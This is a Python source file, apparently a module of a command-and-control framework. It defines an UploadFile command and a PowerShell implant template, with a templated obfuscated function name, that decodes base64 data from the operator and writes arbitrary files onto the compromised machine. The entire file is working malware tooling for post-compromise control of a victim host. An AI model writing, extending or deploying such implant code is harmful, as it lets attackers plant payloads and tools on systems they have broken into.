class UploadFile:
    type = "UF"
    args = "locale-file-name.txt destination_location\\filename.txt"
    input = "upload_file"

    def process_implant_response(self, data, args):
        if data.decode() == "2":
            return "File upload error.", None
        else:
            return f"Successfully uploaded: {args}", None
            # Host data should return a file upload reference not None in future

    def implant_text(self):
        var = '''
function {{ ron.obf_upload_file }} ($b) {
    try { 
        $c = $b.split("::")
        $fn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c[0].ToString()))
        $fc = [System.Convert]::FromBase64String($c[2].ToString())
        $fc | Set-Content "$fn" -encoding Byte -NoNewLine
        $script:tr = 1
    } catch { 
        $script:tr = 0 
    } 
}'''
        return var
